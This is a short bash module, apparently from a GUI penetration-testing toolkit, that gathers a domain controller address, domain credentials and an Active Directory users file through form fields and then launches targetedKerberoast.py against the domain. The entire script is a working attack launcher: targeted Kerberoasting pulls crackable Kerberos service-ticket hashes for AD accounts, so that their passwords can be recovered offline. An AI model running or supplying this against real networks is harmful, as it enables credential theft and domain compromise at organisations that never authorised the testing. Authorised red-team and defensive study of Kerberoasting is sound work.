#!/bin/bash

: '
targeted kerberoast attack on ad users files
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DC_IP_FIELD=$(form_item  "domain controller ip" "dc_ip")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")
DOMAIN_FIELD=$(form_item  "domain" "domain")
DC_HOST_FIELD=$(form_item  "dc host name" "dc_host")
AD_USER_FILE_FIELD=$(form_item  "ad users file" "ad_users_file")

# Generate GUI form
generate_form "${DC_IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}" "${DOMAIN_FIELD}" "${DC_HOST_FIELD}" "${AD_USER_FILE_FIELD}"

DC_IP=${form_data["dc_ip"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}
DOMAIN=${form_data["domain"]}
AD_USER_FILE=${form_data["ad_users_file"]}
DC_HOST=${form_data["dc_host"]}

execute_command "targetedKerberoast.py -u '${USERNAME}' -p '${PASSWORD}' -d ${DOMAIN} --dc-ip ${DC_IP} --users-file ${AD_USER_FILE} --dc-host ${DC_HOST}"
create_new_line
